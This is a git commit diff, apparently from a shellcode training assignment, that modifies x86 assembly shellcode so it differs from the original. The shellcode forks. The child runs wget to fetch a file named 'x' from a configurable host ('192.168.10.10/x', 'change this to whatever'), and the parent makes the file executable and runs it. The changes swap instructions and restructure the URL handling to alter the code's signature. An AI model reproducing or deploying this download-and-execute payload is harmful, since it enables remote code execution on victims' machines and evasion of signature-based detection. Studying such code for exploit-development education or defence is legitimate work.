6541ad35861a5857d0c855ea604f5294e187387f
Daniel Roberson <daniel@planethacker.net>
2017-04-30 20:39:34 -0700

    changed a few things around to make this shellcode different from the original

--- Assignment-6/wget-modified.asm
+++ Assignment-6/wget-modified.asm
@@ -38,31 +38,31 @@ section .text
 _start:
 
     ;fork
-    xor eax,eax
-    mov al,0x2
+    sub eax, eax
+    add eax, 2
     int 0x80
-    xor ebx,ebx
+    sub ebx,ebx
     cmp eax,ebx
     jz child
   
     ;wait(NULL)
-    xor eax,eax
-    mov al,0x7
+    sub eax,eax
+    add al, 7
     int 0x80
         
     ;chmod x
-    xor ecx,ecx
-    xor eax, eax
+    sub ecx, ecx
+    sub eax, eax
     push eax
     mov al, 0xf
     push 0x78
     mov ebx, esp
-    xor ecx, ecx
+    sub ecx, ecx
     mov cx, 0x1ff
     int 0x80
     
     ;exec x
-    xor eax, eax
+    sub eax, eax
     push eax
     push 0x78
     mov ebx, esp
@@ -70,7 +70,8 @@ _start:
     mov edx, esp
     push ebx
     mov ecx, esp
-    mov al, 11
+    ;mov al, 11
+    add eax, 11
     int 0x80
     
 child:
@@ -79,14 +80,12 @@ child:
     pop eax
     cdq
     push edx
-    
-    push 0x782f2f32 ;2//x avoid null byte
-    push 0x32322e32 ;22.2
-    push 0x2e383631 ;.861
-    push 0x2e323931 ;.291
-    mov ecx,esp
-    push edx
-    
+
+    jmp url
+one:
+    pop esi
+    mov ecx, esi
+
     push 0x74 ;t
     push 0x6567772f ;egw/
     push 0x6e69622f ;nib/
@@ -97,4 +96,8 @@ child:
     push ebx
     mov ecx,esp
     int 0x80
+
+url:
+    call one
+    db "192.168.10.10/x" ;; change this to whatever
 
